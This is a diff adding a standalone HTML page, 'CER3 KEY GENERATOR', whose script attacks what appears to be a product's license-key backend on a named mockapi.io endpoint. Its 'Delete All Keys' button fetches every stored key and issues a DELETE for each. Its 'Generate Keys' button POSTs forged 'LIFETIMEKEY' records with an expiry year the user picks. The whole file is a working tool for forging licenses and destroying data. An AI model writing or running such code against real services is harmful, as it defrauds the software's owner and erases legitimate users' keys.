@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CER3 KEY GENERATOR</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: black;
+            border: 2px solid white;
+            padding: 20px;
+            text-align: center;
+            width: 300px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+        }
+
+        #deleteBtn {
+            background-color: red;
+            color: white;
+        }
+
+        #generateBtn {
+            background-color: green;
+            color: white;
+        }
+
+        #output {
+            margin-top: 20px;
+            font-size: 16px;
+            color: white;
+        }
+
+        #keyOutput {
+            margin-top: 10px;
+            background-color: white;
+            color: black;
+            font-size: 14px;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CER3 VULNERABILITY</h1>
+        <button id="deleteBtn" onclick="deleteKeys()">Delete All Keys</button>
+        <button id="generateBtn" onclick="generateKey()">Generate Keys</button>
+        <div id="output"></div>
+        <div id="keyOutput" style="display: none;" onclick="copyKey()">Click to Copy Key</div>
+    </div>
+
+    <script>
+        async function deleteKeys() {
+            const url = "https://673ce3d54db5a341d8334ff8.mockapi.io/keys";
+            const outputDiv = document.getElementById("output");
+            outputDiv.innerHTML = "";  
+
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    outputDiv.innerHTML = `Failed to retrieve items. Status code: ${response.status}`;
+                    return;
+                }
+                const data = await response.json();
+
+                if (data.length === 0) {
+                    outputDiv.innerHTML = "No keys to delete.";
+                    return;
+                }
+
+                for (const item of data) {
+                    const itemId = item.id;
+                    const deleteResponse = await fetch(`${url}/${itemId}`, {
+                        method: 'DELETE',
+                    });
+
+                    if (deleteResponse.ok) {
+                        outputDiv.innerHTML += `Successfully deleted item with ID: ${itemId}<br>`;
+                    } else {
+                        outputDiv.innerHTML += `Failed to delete item with ID: ${itemId}. Status code: ${deleteResponse.status}<br>`;
+                    }
+                }
+            } catch (error) {
+                outputDiv.innerHTML = `Error: ${error.message}`;
+            }
+        }
+
+        async function generateKey() {
+            const outputDiv = document.getElementById("output");
+            const keyOutputDiv = document.getElementById("keyOutput");
+            const year = prompt("Enter the year for the expiration date (e.g., 2269):");
+
+            if (!year || isNaN(year) || year < 2024) {
+                outputDiv.innerHTML = "Invalid year entered.";
+                return;
+            }
+
+            const url = "https://673ce3d54db5a341d8334ff8.mockapi.io/keys";
+            const keyData = {
+                key: `LIFETIMEKEY-${Math.floor(Math.random() * 10000000000)}`,
+                expiresAt: `${year}-11-20T08:22:37.988Z`,
+                userId: `${Math.floor(Math.random() * 10000000000)}`
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(keyData)
+                });
+
+                if (response.ok) {
+                    outputDiv.innerHTML = `Key generated successfully!<br>Key: ${keyData.key}<br>Expires At: ${keyData.expiresAt}`;
+                    keyOutputDiv.style.display = "block";
+                    keyOutputDiv.textContent = keyData.key;  // Display the generated key
+                } else {
+                    outputDiv.innerHTML = `Failed to generate key. Status code: ${response.status}`;
+                }
+            } catch (error) {
+                outputDiv.innerHTML = `Error: ${error.message}`;
+            }
+        }
+
+        function copyKey() {
+            const keyOutputDiv = document.getElementById("keyOutput");
+            const range = document.createRange();
+            range.selectNode(keyOutputDiv);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            alert('Key copied to clipboard!');
+        }
+    </script>
+</body>
+</html>
